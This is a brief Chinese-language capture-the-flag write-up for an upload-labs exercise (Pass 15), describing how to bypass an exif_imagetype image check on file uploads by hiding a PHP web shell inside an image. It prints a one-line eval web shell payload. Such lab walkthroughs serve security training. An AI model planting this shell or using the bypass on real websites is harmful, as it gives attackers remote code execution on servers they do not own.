## 解题wp(By:独立团孙德胜Alan)
本pass可以通过制作图片马绕过

## 1.打开第十五关

![](./img/1.png)

## 2.上传一个普通的shell.php文件

```
<?php @eval($_POST('Alan'));?>
```

![](./img/2.png)



## 3.分析代码

##### ![](./img/3.png)

##### 本Pass中使用的是exif_imagetype函数来检测上传的文件是否为图片，其返回值和Pass-14中getimagesize函数返回值的索引2是一样的

## 4.我们可以本地制作一个图片马绕过

![](./img/4.png)

![](./img/5.png)

